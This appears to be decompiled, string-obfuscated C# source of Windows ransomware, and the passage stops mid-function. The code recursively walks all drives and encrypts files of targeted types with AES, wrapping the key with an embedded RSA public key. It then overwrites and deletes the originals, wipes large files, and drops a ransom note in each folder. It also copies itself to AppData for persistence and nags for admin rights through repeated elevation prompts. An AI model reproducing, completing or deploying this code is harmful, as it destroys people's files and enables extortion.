using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using ConsoleApplication7;
using Microsoft.Win32;

internal class Wait
{
	public static class ControlAppDomain
	{
		public const int WorkStealingQueueList = 797;

		public static IntPtr EditorBrowsableState = new IntPtr(_003CModule_003E.ToUInt64[4]);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr intptr_0);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr intptr_0, IntPtr intptr_1);
	}

	[CompilerGenerated]
	private sealed class ConvertScalarToVector128Single
	{
		public string VARFLAG_FREQUESTEDIT;

		public bool ValueTaskSourceStatus(string string_0)
		{
			return string_0 == VARFLAG_FREQUESTEDIT.ToLower();
		}
	}

	[CompilerGenerated]
	private sealed class ConvertToUInt32RoundToEven
	{
		public string EmptyAsyncLocalValueMap;

		public bool UnitZ => string_0 == EmptyAsyncLocalValueMap;
	}

	private static readonly byte[] GetElementType;

	private static string BitDecrement;

	private static string ThreadPriority;

	public static string get_Enabled;

	public static bool GenericMethodInfo;

	public static string PARAMFLAG_FHASCUSTDATA;

	private static bool GenericTypeArguments;

	private static string FormatStubInfo;

	private static bool __c__DisplayClass0_4;

	private static string POSIX_FADV_DONTNEED;

	public static string TYPEFLAG_FCONTROL;

	private static bool sb;

	private static bool ThreadTransferSendObj;

	private static int GetILGenerator;

	private static string Extended_Pictograph;

	public static string MutexIndex;

	private static string Ldflda;

	private static bool ReadUInt32;

	private static bool EPROTOTYPE;

	private static bool NativeOverlapped;

	private static bool EINVAL;

	private static bool U2;

	public static string IsFinal;

	public static string CompareNotLessThan;

	public static string IsSurrogatePair;

	public static string AbandonedMutexException;

	public static readonly Regex PreserveSigAttribute;

	private static List<string> Era;

	private static string[] GetParamCustData;

	private static Random FindIndex;

	[CompilerGenerated]
	private static ThreadStart Bge;

	[CompilerGenerated]
	private static ThreadStart ToCharsBuffer;

	private static int R8/* Not supported: data(01 00 00 00) */;

	private static int get_MaxValue/* Not supported: data(00 00 00 00) */;

	private static int Key/* Not supported: data(2D 00 00 00) */;

	private static int TargetTypeToken/* Not supported: data(64 00 00 00) */;

	private static int TypeUnloadedException/* Not supported: data(6B 00 00 00) */;

	private static int YearMonths/* Not supported: data(84 00 00 00) */;

	private static int KeyValuePair__2/* Not supported: data(88 00 00 00) */;

	private static int NonEventAttribute/* Not supported: data(97 00 00 00) */;

	private static int Result/* Not supported: data(E9 00 00 00) */;

	public static string MemberInfo
	{
		get
		{
			if (PARAMFLAG_FHASCUSTDATA == "")
			{
				StringBuilder stringBuilder = new StringBuilder();
				for (int i = 0; i < int_0; i++)
				{
					string string_ = "耖耕耔耓耒耑耐耟耞耝耜耛耚耙耘耇耆者耄考耂老耀耏耎耍聇聆聅聄聃聂聁聀聏聎";
					_003CModule_003E.smethod_0(ref string_, new object[5] { 3937, 'ბ', "\u00060\0\0\0\0\u0002", 24589, false });
					string text = string_;
					Random findIndex = FindIndex;
					string string_2 = "黗黔黕黒黓黐黑點黟黜黝黚黛默黙黆黇黄黅黂黃黀黁黎黏黌麆麇麄麅麂麃麀麁麎麏";
					_003CModule_003E.smethod_0(ref string_2, new object[5] { 18884, 'ಪ', 16810, 'ˠ', 'ξ' });
					char value = text[findIndex.Next(0, string_2.Length)];
					stringBuilder.Append(value);
				}
				return stringBuilder.ToString();
			}
			return PARAMFLAG_FHASCUSTDATA;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint uint_0, uint uint_1, string string_0, uint uint_2);

	private static void IEqualityComparer__1(string[] args)
	{
		if (Tasks())
		{
			new Thread((ThreadStart)delegate
			{
				Callbacks();
			}).Start();
			return;
		}
		if (NoFreeBuffers())
		{
			Environment.Exit(R8);
		}
		if (ThreadTransferSendObj)
		{
			ETXTBSY();
		}
		if (ReadUInt32)
		{
			TypeLoadException(POSIX_FADV_DONTNEED);
		}
		else if (__c__DisplayClass0_4)
		{
			NodeKeyValueEnumerator(POSIX_FADV_DONTNEED);
		}
		if (sb)
		{
			W();
		}
		if (ReadUInt32)
		{
			if (EPROTOTYPE)
			{
				ReadDecimal();
			}
			if (NativeOverlapped)
			{
				EnumInfo();
			}
			if (EINVAL)
			{
				TimeZoneDisplayNameType();
			}
			if (U2)
			{
				AddScalar();
			}
		}
		get_Execution();
		if (GenericTypeArguments)
		{
			InterfaceType(FormatStubInfo);
		}
		GetAllFuncCustData();
		SubtractRoundedHighNarrowingLower(Extended_Pictograph);
		new Thread((ThreadStart)delegate
		{
			Callbacks();
		}).Start();
	}

	public static void Callbacks()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void ETXTBSY()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(GetILGenerator * 1000);
		}
	}

	private static bool NoFreeBuffers()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		for (int i = ((Array)(object)string.Empty).Length; i < array.Length; i++)
		{
			Process process = array[i];
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return (byte)R8 != 0;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string GetColumnNumber(int int_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < int_0; i++)
		{
			string string_ = "䖀䖃䖂䖅䖄䖇䖆䖉䖈䖋䖊䖍䖌䖏䖎䖑䖐䖓䖒䖕䖔䖗䖖䖙䖘䖛䗑䗐䗓䗒䗕䗔䗗䗖䗙䗘";
			_003CModule_003E.smethod_0(ref string_, new object[3] { false, "ӎƀ*¬\u008a", "Ƨ\u1ac6ἚĻ®Ã" });
			string text = string_;
			Random findIndex = FindIndex;
			string string_2 = "낾낽낼낻낺낹낸낷낶낵내낳낲낱낰낯낮낭났낫낪납남낧낦낥냯냮냭냬냫냪냩냨냧냦";
			_003CModule_003E.smethod_0(ref string_2, new object[5] { 974, 477, false, '\uaa4d', 231 });
			char value = text[findIndex.Next(0, string_2.Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string UnsafeAddrOfPinnedArrayElement(string string_0)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_0);
		return Convert.ToBase64String(bytes);
	}

	private static void DefineLabel(string string_0)
	{
		try
		{
			string[] files = Directory.GetFiles(string_0);
			bool flag = true;
			string VARFLAG_FREQUESTEDIT;
			for (int i = 0; i < files.Length; i += Convert.ToInt32("1", 16))
			{
				try
				{
					VARFLAG_FREQUESTEDIT = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(GetParamCustData, (string string_0) => string_0 == VARFLAG_FREQUESTEDIT.ToLower()) || !(fileName != Ldflda))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					string text = InterfaceIsDual(40);
					if (fileInfo.Length < 1368709120L)
					{
						string string_ = EncoderLatin1BestFitFallback(text, Overlaps());
						if (TZVersion(files[i]) && HexInt16(fileInfo.Name))
						{
							NormalMantissaMask(files[i], text, string_);
						}
					}
					else
					{
						Detachable(files[i], text, fileInfo.Length);
					}
					if (flag)
					{
						flag = false;
						string string_2 = "秤";
						_003CModule_003E.smethod_0(ref string_2, new object[5] { false, 9719, 5796, 'ߛ', 13653 });
						string path = string_0 + string_2 + Ldflda;
						string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
						if (!File.Exists(path) && string_0 != folderPath)
						{
							File.WriteAllLines(path, Era);
						}
					}
				}
				catch (Exception)
				{
				}
			}
			string[] directories = Directory.GetDirectories(string_0);
			for (int j = 0; j < directories.Length; j++)
			{
				DefineLabel(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	private static bool HexInt16(string string_0)
	{
		char[] array = new char[1] { '\a' };
		int[] array2 = new int[2] { 1, 10 };
		string[] array3 = new string[12];
		int num = Convert.ToInt32("0", 2);
		string string_ = "ẫẦẦẽủẠầẠ";
		_003CModule_003E.smethod_0(ref string_, new object[2] { 2184, 5697 });
		array3[num] = string_;
		int num2 = array2[0];
		string string_2 = "ᢂᢏᢏᢔ\u1886ᢏᢎᢔᣎᢂᢉᢎ";
		_003CModule_003E.smethod_0(ref string_2, new object[5] { false, 2240, "ܯΌæ\u009a*\u0004\u0002", 404, 545 });
		array3[num2] = string_2;
		string string_3 = "\u0e65\u0e68\u0e68\u0e73ษ\u0e6e\u0e69\u0e6e";
		_003CModule_003E.smethod_0(ref string_3, new object[4] { 'ҋ', 'բ', 918, 132 });
		array3[2] = string_3;
		string string_4 = "珜珖珚珛珖珔珖珝珐玛珑珗";
		_003CModule_003E.smethod_0(ref string_4, new object[3] { 7276, "ᝊã\u1928Ū\u009eß", 8973 });
		array3[3] = string_4;
		string string_5 = "밗밍밌밊발밋뱗밝반밍";
		_003CModule_003E.smethod_0(ref string_5, new object[5] { false, "ìըzÅ\u0011", 8366, "j\u0004\u000f", 37802 });
		array3[4] = string_5;
		string string_6 = "ڸڢڣڥڳڤ۸ڲڷڢ۸ںڹڱ";
		_003CModule_003E.smethod_0(ref string_6, new object[5] { 512, 342, 'g', 372, 421 });
		array3[5] = string_6;
		string string_7 = "ちほぺぼなぽ〡てちて";
		_003CModule_003E.smethod_0(ref string_7, new object[5] { "\u0d47ۋwљţ\u0002\u0005", "ǳǼÚ", 1636, "ں\r\0\u0002", 'ύ' });
		array3[6] = string_7;
		char num3 = array[0];
		string string_8 = "\uf350\uf34c\uf351\uf349\uf346\uf357\uf30a\uf340\uf346";
		_003CModule_003E.smethod_0(ref string_8, new object[3] { 48839, 'ᬡ', "ዸҼ(Ó\u008d" });
		array3[(uint)num3] = string_8;
		string string_9 = "\udca9\udcbd\udcbc\udca7\udcba\udcbd\udca6\udce6\udca1\udca6\udcae";
		_003CModule_003E.smethod_0(ref string_9, new object[3] { false, 17007, '驙' });
		array3[8] = string_9;
		IntPtr intPtr = (nint)((Array)(object)"\u0368\u034d\u035c\u034d\u0364\u0351\u033d\u0311\u033d").LongLength;
		string string_10 = "ᄁᄌᄌᄗᄐᄆᄀᄗᅍᄁᄂᄈ";
		_003CModule_003E.smethod_0(ref string_10, new object[2] { 4106, "Ï'\u000fA\v\u0006\u0002" });
		array3[(nint)intPtr] = string_10;
		int num4 = array2[1];
		string string_11 = "肙肔肔肏肖肜肝肌胕肞肝肒";
		_003CModule_003E.smethod_0(ref string_11, new object[5] { '\u0489', 2046, "Ɏ\u0083\u0004\v\u001b\u0003", '煶', false });
		array3[num4] = string_11;
		int num5 = Convert.ToInt32("b", 16);
		string string_12 = "\uedb5\uedb4\ueda2\uedba\ueda5\uedbe\ueda1\uedff\uedb8\uedbf\uedb8";
		_003CModule_003E.smethod_0(ref string_12, new object[4] { 21443, 14743, 17834, 6861 });
		array3[num5] = string_12;
		string[] array4 = array3;
		string[] array5 = array4;
		int num6 = 0;
		while (true)
		{
			if (num6 < array5.Length)
			{
				string text = array5[num6];
				if (text == string_0)
				{
					break;
				}
				num6++;
				continue;
			}
			return (byte)array2[0] != 0;
		}
		return (byte)Convert.ToInt32("0", 2) != 0;
	}

	private static bool TZVersion(string string_0)
	{
		int[] array = new int[1] { 0 };
		string_0 = string_0.ToLower();
		string[] array2 = new string[Convert.ToInt32("11", 2)];
		string string_ = "㦨㦹㦹㦭㦨㦽㦨㦕㦥㦦㦪㦨㦥";
		_003CModule_003E.smethod_0(ref string_, new object[4] { "९ᦧՊ", false, 1718, 'ળ' });
		array2[0] = string_;
		string string_2 = "䓶䓧䓧䓳䓶䓣䓶䓋䓻䓸䓴䓶䓻䓻䓸䓠";
		_003CModule_003E.smethod_0(ref string_2, new object[6] { 2427, 5067, 'ӈ', 7507, 1334, false });
		array2[1] = string_2;
		string string_3 = "\u08f6\u08f0\u08e6\u08f1\u08f0\u08df\u08e2\u08ef\u08efࢣ\u08f6\u08f0\u08e6\u08f1\u08f0";
		_003CModule_003E.smethod_0(ref string_3, new object[4] { "ʇˊ«{\u0095", false, 'ğ', 'X' });
		array2[2] = string_3;
		string[] array3 = array2;
		string[] array4 = array3;
		int num = 0;
		while (true)
		{
			if (num < array4.Length)
			{
				string value = array4[num];
				if (string_0.Contains(value))
				{
					break;
				}
				num += Convert.ToInt32("1", 8);
				continue;
			}
			return true;
		}
		return (byte)array[0] != 0;
	}

	public static string Overlaps()
	{
		StringBuilder stringBuilder = new StringBuilder();
		string string_ = "\u08c9\u08ca\u088d\u0898\u0899\u08d5\u0883\u0890\u0887\u0886\u089c\u089a\u089b\u08c8\u08d7ࣄ\u08dbࣅ\u08d7\u08d5\u0890\u089b\u0896\u089a\u0891\u089c\u089b\u0892\u08c8\u08d7\u0880\u0881\u0893\u08d8ࣄࣃ\u08d7\u08ca\u08cb";
		_003CModule_003E.smethod_0(ref string_, new object[4] { 520, 1352, 297, "\u001dX\u0003\0\u0001\u0001\u0002" });
		stringBuilder.AppendLine(string_);
		string string_2 = "祸礖礗礅礔礥礶礥礩礡礰礡礶礷祤礼礩礨礪礷祾礼礷礠祹祦礬礰礰礴祾祫祫礳礳礳祪礳祷祪礫礶礣祫祶祴祴祵祫礜礉礈礗礧礬礡礩礥祦祤礼礩礨礪礷祾礼礷礭祹祦礬礰礰礴祾祫祫礳礳礳祪礳祷祪礫礶礣祫祶祴祴祵祫礜礉礈礗礧礬礡礩礥祩礭礪礷礰礥礪礧礡祦祺";
		_003CModule_003E.smethod_0(ref string_2, new object[4] { '䞦', "ݦ¬¤\u0012Ć\u001e", 7798, 2364 });
		stringBuilder.AppendLine(string_2);
		string string_3 = "\ua8e3\ua8e3\ua8ffꢆ\ua8bbꢳꢬꢭꢦꢭ\ua8b7ꣽꢂꢒꢂ\ua881\ua8ff\ua8ecꢆ\ua8bbꢳꢬꢭꢦꢭ\ua8b7ꣽ";
		_003CModule_003E.smethod_0(ref string_3, new object[5] { "ǃŕҷ\u0314", 8360, "◺ᐰ", 9852, 7314 });
		stringBuilder.AppendLine(string_3);
		string string_4 = "꾍꾍꾑꿠꿂꿉꿘꿁꿘꿞꾓꿔꾝꿎꿺꾝꿢꿂꿻꾜꿙꿊꿠꿦꿸꿛꿿꿨꿃꿽꿢꿪꿷꾚꿹꿏꿼꿁꿾꿨꿯꿨꾘꿔꿜꿅꿴꿤꿢꿴꿻꿻꿷꿪꿚꿿꾂꿣꾕꿎꾆꿃꿸꿟꿗꿼꿣꿞꾛꿮꿋꿊꿸꿾꿺꾚꿝꿇꿌꿨꿜꿌꿫꾂꿊꿆꿹꿆꾂꿣꿬꿹꿔꿥꿅꿁꿧꿇꾝꿾꿯꿟꿪꿨꿄꿸꿮꾔꿙꿟꿫꿣꿧꿃꾆꿥꿷꾔꿝꾆꾝꿹꿜꿀꾞꿩꿵꾟꾚꿫꿥꿜꿜꿥꿉꿢꿘꿘꿷꿉꾜꾝꾜꿠꿊꿪꿺꿫꾛꿅꾜꿆꿆꿅꾜꿎꿘꿟꿗꿡꿪꿨꿿꿔꿘꿈꿪꿇꾟꿧꿹꿦꿯꿪꿟꿏꿽꿎꿧꿅꿹꿢꿝꾙꿘꿺꿏꿻꾂꿉꾆꿹꿻꿮꿥꿏꿷꿿꿬꿸꿷꿌꿀꿋꾛꿂꾆꿈꿚꿤꿃꾂꾔꿃꿀꿿꾚꿼꾙꿔꿅꿩꿠꿂꿯꾛꿘꿡꾂꿧꿷꿡꿕꿌꿉꾘꾞꿂꿷꿁꿬꿗꿥꿛꿮꿮꿞꿛꿎꾟꿇꿂꾟꿮꾂꿽꿊꿁꿞꿬꿃꿼꿋꿎꿤꿩꿌꾙꾛꿸꿼꾕꿷꿈꿟꿜꿻꿆꿆꿋꿣꿽꿊꿸꿞꿜꿿꿟꿡꿻꿔꿷꿈꿥꿀꿄꿺꿧꿽꿄꿨꿿꿺꾛꾛꿙꿃꿌꿥꿈꿀꿷꿵꿀꿽꿹꿸꿷꿡꿄꾞꿷꿹꿨꿺꿾꿯꿈꿊꿅꾛꾜꾔꿽꾟꿿꿯꿢꿼꿚꾘꿚꾚꿨꿷꿺꿔꾞꿹꿛꿣꿷꿼꾐꾐꾑꾂꿠꿂꿉꿘꿁꿘꿞꾓";
		_003CModule_003E.smethod_0(ref string_4, new object[5] { 6431, '䅯', 5799, 211, "ɋܗ\u1c38ᇍӳŋ" });
		stringBuilder.AppendLine(string_4);
		string string_5 = "\ue430\ue423\ue45e\ue45f\ue44d\ue45c\ue46d\ue47e\ue46d\ue461\ue469\ue478\ue469\ue47e\ue47f\ue432";
		_003CModule_003E.smethod_0(ref string_5, new object[2] { '銀', "⬓♹" });
		stringBuilder.AppendLine(string_5);
		return stringBuilder.ToString();
	}

	public static string InterfaceIsDual(int int_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < int_0--)
		{
			string string_ = "㽖㽕㽔㽓㽒㽑㽐㽟㽞㽝㽜㽛㽚㽙㽘㽇㽆㽅㽄㽃㽂㽁㽀㽏㽎㽍㽶㽵㽴㽳㽲㽱㽰㽿㽾㽽㽼㽻㽺㽹㽸㽧㽦㽥㽤㽣㽢㽡㽠㽯㽮㽭㼆㼅㼄㼃㼂㼁㼀㼏㼎㼇㼝㼖㼊㼑㼈㼑㼘";
			_003CModule_003E.smethod_0(ref string_, new object[5] { 1176, 5636, 4229, "ᇪȡ\v", false });
			string text = string_;
			string string_2 = "ਸ\u0a3b\u0a3a\u0a3d\u0a3c\u0a3f\u0a3e\u0a31ਰਲ਼ਲਵ\u0a34\u0a37ਸ਼\u0a29ਨਫਪਭਬਯਮਡਠਣਘਛਚਝਜਟਞ\u0a11ਐਓ\u0a12ਕਔਗਖਉਈ\u0a0bਊ\u0a0d\u0a0cਏ\u0a0e\u0a01\u0a00\u0a03੨੫੪੭੬੯੮\u0a61\u0a60੩ੳ\u0a78\u0a64\u0a7f੦\u0a7f੶";
			_003CModule_003E.smethod_0(ref string_2, new object[4] { 1724, 'ˠ', 129, "\b\u0014\a\u0019" });
			stringBuilder.Append(text[random.Next(string_2.Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void NormalMantissaMask(string string_0, string string_1, string string_2)
	{
		char[] array = new char[1] { '\b' };
		int[] array2 = new int[1] { 1 };
		string string_3 = "쭝";
		_003CModule_003E.smethod_0(ref string_3, new object[2] { '\ua710', 9315 });
		string path = string_0 + string_3 + Wait.get_MemberInfo(4);
		byte[] array3 = new byte[Marshal.SizeOf(typeof(Element1))];
		RuntimeHelpers.InitializeArray(array3, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
		byte[] array4 = array3;
		FileStream fileStream = new FileStream(path, (FileMode)Marshal.SizeOf(typeof(GetDateTimeFormats)));
		byte[] bytes = Encoding.UTF8.GetBytes(string_1);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = Convert.ToInt32("100", 16);
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array4, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / (int)array[0]);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		fileStream.Write(array4, 0, array4.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), (CryptoStreamMode)array2[0]);
		FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(string_2);
			streamWriter.Flush();
			streamWriter.Close();
		}
		string string_4 = "谓";
		_003CModule_003E.smethod_0(ref string_4, new object[3] { "㈭иߍэ3¹e", '䡜', false });
		File.WriteAllText(string_0, string_4);
		File.Delete(string_0);
	}

	private static void VT_CLSID(string string_0, string string_1)
	{
		char[] array = new char[1] { '\b' };
		int[] array2 = new int[1] { 8 };
		byte[] bytes = Encoding.ASCII.GetBytes(string_1);
		byte[] array3 = new byte[(uint)array[0]];
		RuntimeHelpers.InitializeArray(array3, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
		byte[] salt = array3;
		string string_2 = "핏";
		_003CModule_003E.smethod_0(ref string_2, new object[6] { '䱷', false, 14591, 8351, 6561, 5547 });
		FileStream stream = new FileStream(string_0 + string_2 + Wait.get_MemberInfo(4), FileMode.Create);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = Convert.ToInt32("400", 8);
		rijndaelManaged.BlockSize = Marshal.SizeOf(typeof(ParentMethodTable));
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, Convert.ToInt32("3e8", 16));
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / array2[0]);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = (PaddingMode)Convert.ToInt32("3", 8);
		rijndaelManaged.Mode = (CipherMode)_003CModule_003E.ToUInt64[0];
		using (CryptoStream cryptoStream = new CryptoStream(stream, rijndaelManaged.CreateEncryptor(), (CryptoStreamMode)Marshal.SizeOf(typeof(GUID))))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open);
			fileStream.CopyTo(cryptoStream);
			fileStream.Flush();
			cryptoStream.Flush();
			fileStream.Close();
			cryptoStream.Close();
		}
		string string_3 = "픚";
		_003CModule_003E.smethod_0(ref string_3, new object[5] { false, 26831, 5217, 2581, 19936 });
		File.WriteAllText(string_0, string_3);
		File.Delete(string_0);
	}

	private static void Detachable(string string_0, string string_1, long long_0)
	{
		KeyPair();
		string string_2 = "\ue450";
		_003CModule_003E.smethod_0(ref string_2, new object[3] { 24225, '蓏', "S!AY" });
		using FileStream fileStream = new FileStream(string_0 + string_2 + Wait.get_MemberInfo(((Array)(object)"\u0350\u0308\u034e\u032a").Length), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(long_0);
		string string_3 = "ꬦ";
		_003CModule_003E.smethod_0(ref string_3, new object[4] { 40729, "\u0014S\u000e\u0004", 1894, 1057 });
		File.WriteAllText(string_0, string_3);
		File.Delete(string_0);
	}

	public static byte[] KeyPair()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string EncoderLatin1BestFitFallback(string string_0, string string_1)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_0);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(string_1.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void get_Execution()
	{
		char[] array = new char[1] { '\u0001' };
		int[] array2 = new int[1] { 3 };
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string string_ = "꧁\ua9b8꧞";
			_003CModule_003E.smethod_0(ref string_, new object[6] { '\u0340', false, "ȍڮ3¦", "ਹȰhý", "姟ர\u05a1ᇘ", 4568 });
			string text = string_;
			if (driveInfo.ToString() == text)
			{
				string[] array3 = new string[9];
				string string_2 = "蠵蠗蠊蠂蠗蠄蠈衅蠣蠌蠉蠀蠖";
				_003CModule_003E.smethod_0(ref string_2, new object[4] { '㶰', '⩁', 8308, false });
				array3[0] = string_2;
				char num = array[0];
				string string_3 = "镡镃镞镖镃镐镜锑長镘镝镔镂锑错镉锉锇锘";
				_003CModule_003E.smethod_0(ref string_3, new object[3] { false, "♟ы׃ᄐ\u0829ȍ\u0ab4", 16074 });
				array3[(uint)num] = string_3;
				string string_4 = "䬻䬅䬂䬈䬃䬛䬟";
				_003CModule_003E.smethod_0(ref string_4, new object[5] { false, 7, 1127, 18115, "\u0017$" });
				array3[2] = string_4;
				int num2 = array2[0];
				string string_5 = "쪋쪬쪶쪧쪮";
				_003CModule_003E.smethod_0(ref string_5, new object[3] { "\u0cc2\u1754\u0e5d斅", "⺏\u0085ĈŰõI", false });
				array3[num2] = string_5;
				string string_6 = "囇囲囥囱四囸困囤";
				_003CModule_003E.smethod_0(ref string_6, new object[5] { 11199, 924, 3192, 6852, false });
				array3[4] = string_6;
				string string_7 = "嫿嫁嫆嫌嫇嫟嫛媆嫇嫄嫌";
				_003CModule_003E.smethod_0(ref string_7, new object[5] { 'Ӂ', 1067, 420, 1791, 18713 });
				array3[5] = string_7;
				string string_8 = "…\u202a‣";
				_003CModule_003E.smethod_0(ref string_8, new object[6] { 7197, 616, "±®\u00047", false, "\r\a\u001c", 24 });
				array3[6] = string_8;
				int num3 = Marshal.SizeOf(typeof(Send));
				string string_9 = "\uda49\uda51\uda4e\uda43\uda4e\uda46";
				_003CModule_003E.smethod_0(ref string_9, new object[5] { "a<v5{\u001c\u000f", false, 42263, 3471, '╳' });
				array3[num3] = string_9;
				string string_10 = "뷷뷕뷈뷀뷕뷆뷊뷣뷆뷓뷆";
				_003CModule_003E.smethod_0(ref string_10, new object[4] { false, '䟕', 21558, 8604 });
				array3[8] = string_10;
				string[] array4 = array3;
				string[] directories = Directory.GetDirectories(text);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string EmptyAsyncLocalValueMap = directoryInfo.Name;
					if (!Array.Exists(array4, (string string_0) => string_0 == EmptyAsyncLocalValueMap))
					{
						DefineLabel(directories[j]);
					}
				}
			}
			else
			{
				DefineLabel(driveInfo.ToString());
			}
		}
	}

	private static void NodeKeyValueEnumerator(string string_0)
	{
		char[] array = new char[1] { '\a' };
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string folderPath = Environment.GetFolderPath((Environment.SpecialFolder)array[0]);
		string string_ = "ဏ";
		_003CModule_003E.smethod_0(ref string_, new object[4] { 3217, 527, false, 435 });
		_ = folderPath + string_ + friendlyName;
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string string_2 = "엧";
		_003CModule_003E.smethod_0(ref string_2, new object[4] { 10664, '浠', false, 11955 });
		string text = folderPath2 + string_2;
		string text2 = text + string_0;
		if (!(friendlyName != string_0) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void TypeLoadException(string string_0)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string string_ = "䈠";
		_003CModule_003E.smethod_0(ref string_, new object[5] { "ᄥࠐ\u008a\u001d\"\u009dX", 6237, false, 569, "௷I\u001d./\u0019 " });
		_ = folderPath + string_ + friendlyName;
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string string_2 = "왎";
		_003CModule_003E.smethod_0(ref string_2, new object[4] { "ቴčÕ\u0618", 19679, "Ҿฅ_\u0006\u0005\t", 19343 });
		string text = folderPath2 + string_2;
		string text2 = text + string_0;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		string string_3 = "簻簼簧簨簺";
		_003CModule_003E.smethod_0(ref string_3, new object[6] { 568, 19910, false, 3074, 7839, 426 });
		processStartInfo.Verb = string_3;
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != string_0) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(_003CModule_003E.ToUInt64[0]);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					TypeLoadException(string_0);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
